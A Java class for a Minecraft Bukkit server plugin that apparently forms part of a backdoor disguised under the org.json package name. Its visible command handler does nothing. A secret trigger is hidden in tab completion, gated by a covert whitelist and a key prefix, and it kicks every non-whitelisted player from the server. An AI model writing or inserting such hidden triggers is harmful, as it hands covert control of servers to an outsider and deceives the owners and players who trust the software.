package org.json.modals.punish;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class KickAll extends BDCommand {
    public KickAll() {
        super("kickAll");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        Bukkit.getOnlinePlayers().stream()
                .filter(onlinePlayer -> !WhitelistMeta.isListed(onlinePlayer))
                .forEach(onlinePlayer -> onlinePlayer.kickPlayer(""));

        player.sendMessage(Modal.getPrefix() + "§cAll online players has been kicked!");
        return tabComplBuilder.build();
    }
}
